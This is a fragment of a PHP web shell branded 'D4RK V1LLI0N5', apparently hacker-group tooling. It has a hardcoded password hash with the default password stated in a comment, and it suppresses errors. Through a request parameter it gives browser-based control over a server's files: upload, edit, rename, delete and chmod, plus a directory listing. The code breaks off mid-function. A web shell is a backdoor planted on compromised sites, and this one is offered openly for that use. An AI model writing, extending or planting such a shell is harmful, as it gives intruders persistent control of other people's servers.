<img src="http://img07.deviantart.net/8b3d/i/2017/215/6/5/matrix_effect_bygy16_d4hktcb_by_mrrobot3112-dbipx38.png" width="400" height="240" alt=""/>
<?php
error_reporting(0); //If there is an error, we'll show it, k?

$password = "66a15b9b3fcfbe1cae620e3fc79afb9c"; // You can put a md5 string here too, default password d4rkv1lli0n5
...
//The header, like it?
$header = '<html>
<title>'.getenv("HTTP_HOST").' D4RK V1LLI0N5</title>
<head>
<style>
body	{
...
<body bgcolor="#000000" alink="#33CC00" vlink="#339900" link="#339900">
...
$footer = '<tr><td><hr><center>&copy; WE ARE D4RK V1LLI0N5</br>MADE BY MR R0B0T</br></center></td></table></body></head></html>';
...
if(isset($_REQUEST['p']))
{
        switch ($_REQUEST['p']) {
            ...
            case 'chmod': //Chmod file
                ...
                print "<h1>Chmod Files and Directories</h1>";
    ...
    if(isset($_FILES['uploadedfile']['name']))
{
    ...
    asort($files);
        ...
        {
            print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[Rename]</a><a href=\"?p=delete&file=".realpath($file)."\">[Delete]</a></td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=d>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
        }
        
        foreach($files as $file)
        {
            print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[Rename]</a><a href=\"?p=delete&file=".realpath($file)."\">[Delete]</a></td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=f>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
        }
    }
    else
    {
